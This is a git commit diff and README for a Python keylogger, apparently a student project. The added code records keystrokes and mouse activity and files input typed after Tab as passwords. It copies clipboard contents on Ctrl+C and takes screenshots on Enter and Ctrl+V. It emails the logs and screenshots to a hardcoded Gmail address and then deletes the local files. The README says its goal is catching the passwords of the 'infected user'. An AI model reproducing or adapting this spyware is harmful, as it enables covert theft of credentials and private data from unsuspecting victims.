df8f9448920092e96f6d6f9e91b0131ce76404bf
Vladul555 <vladigo3@ac.sce.ac.il>
2022-04-06 15:16:56 +0300

    finito

--- Keylogger.py
+++ Keylogger.py
@@ -1,14 +1,15 @@
 import ctypes
 import smtplib
+import clipboard
+import pyautogui
+import os
+
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
 from email.header import Header
-
-import clipboard
 from pynput import keyboard
 from pynput import mouse
-import os
 from pynput.keyboard import Key
 
 tab_key = False
@@ -16,6 +17,7 @@ Arr_mouse = []  # an arr to hold the mouse inputs
 Arr_key = []  # an arr to hold the mouse inputs
 count_M_move = 0  # made so that the log file won't be filed with mouse positions
 Arr_Password = []
+file = ""
 
 # the data in this section is a burnout. you can change it or enter the email for testing
 #####################################
@@ -29,12 +31,12 @@ port = 465
 def on_move(x, y):  # tracks the movement of the mouse
     global count_M_move, Arr_mouse
     count_M_move += 1
-    if count_M_move == 1000:  # ones every 1000 mouse movements
+    if count_M_move == 10000:  # ones every 10000 mouse movements
         count_M_move = 0
         Arr_mouse.append(str([x, y]))
         Arr_mouse.insert(0, '\nMouse is at position: ')
         Arr_mouse.append('\n')
-        write_to_Log_file(Arr_mouse)
+        write_to_file_mouse(Arr_mouse)
         Arr_mouse = []
 
 
@@ -43,31 +45,37 @@ def on_click(x, y, button, pressed):  # tracks the clicks of the mouse
     Arr_mouse.append(str([x, y]))
     Arr_mouse.insert(0, '\nMouse click at position: ')
     Arr_mouse.append('\n')
-    write_to_Log_file(Arr_mouse)
+    write_to_file_mouse(Arr_mouse)
     Arr_mouse = []
 
 
 def on_press(key):  # tracks the key press of the keyboard
     global Arr_key, tab_key
+    if key == Key.enter:
+        screenshot()
     if key == Key.tab:
         if not tab_key:
             tab_key = True
         else:
             tab_key = False
-    if tab_key:
-        Arr_key.append(key)
-        write_to_Passwords_file(Arr_key)
-        Arr_key = []
-    else:
-        Arr_key.append(key)
-        write_to_Log_file(Arr_key)
-        Arr_key = []
+    if key == Key.enter and tab_key:
+        tab_key = False
+    Arr_key.append(key)
+    write_to_file(Arr_key)
+    Arr_key = []
 
 
 def on_release(key):  # tracks the key release of the keyboard
     if key == Key.esc:
-        # os.remove("Log.txt")
-        # os.remove("Passwords.txt")
+        send_email_w_attachment("burnkeylogger9000@gmail.com", "The keylogger info you wanted",
+                                "Have a nice Day", "Log.txt")
+        os.remove("Log.txt")
+        send_email_w_attachment("burnkeylogger9000@gmail.com", "The keylogger info you wanted",
+                                "Have a nice Day", "Passwords.txt")
+        os.remove("Passwords.txt")
+        send_email_w_attachment("burnkeylogger9000@gmail.com", "The keylogger info you wanted",
+                                "Have a nice Day", "Mouse_movement.txt")
+        os.remove("Mouse_movement.txt")
         return False
 
 
@@ -77,42 +85,52 @@ def get_capslock_state():
     return hllDll.GetKeyState(VK_CAPITAL)
 
 
-def write_to_Log_file(keys):
-    with open("Log.txt", 'a') as f:
+def write_to_file_mouse(keys):
+    with open('Mouse_movement.txt', 'a') as f:
+        for key in keys:
+            f.write(key)
+    f.close()
+
+    count = count_rows('Mouse_movement.txt')
+    if count > 50:
+        send_email_w_attachment("burnkeylogger9000@gmail.com", "The keylogger info you wanted",
+                                "Have a nice Day", 'Mouse_movement.txt')
+        os.remove('Mouse_movement.txt')
+
+
+def write_to_file(keys):
+    global tab_key, file
+    if tab_key:
+        file = "Passwords.txt"
+    else:
+        file = "Log.txt"
+    with open(file, 'a') as f:
         for key in keys:
             k = str(key).replace("'", "")  # changing the input from 'z' --> z
-            if k.find("space") > 0:
+            if k.find("enter") > 0:
+                f.write('\n')
+            elif k.find("space") > 0:
                 f.write(' ')
             elif k.find("x03") > 0:  # if the user did a ctrl+c
                 text = clipboard.paste()
+                file = "Passwords.txt"
                 write_to_Passwords_file_ctrl(text)
                 f.write('\n')
+            elif k.find("x16") > 0:  # if the user did a ctrl+v
+                screenshot()
             elif k.find("Key") == -1:
                 if get_capslock_state():
                     f.write(k.upper())
                 else:
                     f.write(k)
         f.close()
-    # count = count_rows("Log.txt")
-    # if count > 50:  # ones the log file is 50 rows long an email will be sent
-    #     send_email_w_attachment("burnkeylogger9000@gmail.com", "burnkeylogger9000@gmail.com",
-    #                             "Have a nice Day", "Log.txt")
-    #     f.close()
-    #     os.remove("Log.txt")  # after the sending the file will be deleted
 
-
-def write_to_Passwords_file(keys):
-    with open("Passwords.txt", 'a') as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            if k.find("enter") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                if get_capslock_state():
-                    f.write(k.upper())
-                else:
-                    f.write(k)
-    f.close()
+    count = count_rows(file)
+    if count > 50:  # ones the log file is 50 rows long an email will be sent
+        send_email_w_attachment("burnkeylogger9000@gmail.com", "The keylogger info you wanted",
+                                "Have a nice Day", file)
+        f.close()
+        os.remove(file)  # after the sending the file will be deleted
 
 
 def write_to_Passwords_file_ctrl(text):
@@ -121,8 +139,8 @@ def write_to_Passwords_file_ctrl(text):
     f.close()
 
 
-def count_rows(file):  # counting the amount or rows in the text file
-    with open(file) as f:
+def count_rows(F):  # counting the amount or rows in the text file
+    with open(F) as f:
         count = sum(1 for _ in f)
         return count
 
@@ -153,6 +171,14 @@ def send_email_w_attachment(to, subject, body, filename):
     # send email and quit server
     server.sendmail(user, to, message.as_string())
     server.quit()
+
+
+def screenshot():
+    im = pyautogui.screenshot()
+    im.save("screenshot.jpg")
+    send_email_w_attachment("burnkeylogger9000@gmail.com",
+                            "The keylogger info you wanted", "Have a nice Day", "screenshot.jpg")
+    os.remove("screenshot.jpg")
 
 
 with mouse.Listener(on_move=on_move, on_click=on_click) as listener:
--- README.txt
+++ README.txt
@@ -12,15 +12,17 @@ Made by : Vladislav golobin.
 
 The Keylogger program will do the following:
 	
-	1. Track the mouse movment and write it in the "Log.txt" file every 500 inputs.
-	2. Track the mouse clicks and write it in the "Log.txt" file.
+	1. Track the mouse movement and write it in the "Mouse_movement.txt" file every 10000 inputs.
+	2. Track the mouse clicks and write it in the "Mouse_movement.txt" file.
 	3. Track the keyboard key presses and write it in the "Log.txt" file.
 	4. Every 50 rows written to the "Log.txt" file it will be sent to an email address, the email is a test email.
-	   *if you like to enter and see that the email are sending, the password and email addres will be given in the end of the "Help.txt" file.*
+	   *if you like to enter and see that the email are sending, the password and email address will be given in the end of the "Help.txt" file*
 	   *the email sending will be possible only via gmail*
-	5. After every email sent the "Log.txt" file will be deleted
-	6. The exiting condition will be the "esc" key
-
+	5. After every email sent the "Log.txt" file will be deleted.
+	6. The exiting condition will be the "esc" key.
+	7. Every 50 rows written to the "Passwords.txt" file it will be sent to an email address.
+	8. After every email sent the "Password.txt" file will be deleted.
+	9. The program will try and catch the username and passwords of the infected user by copying the clipboard and taking screenshot at certen conditions.
 
 
 
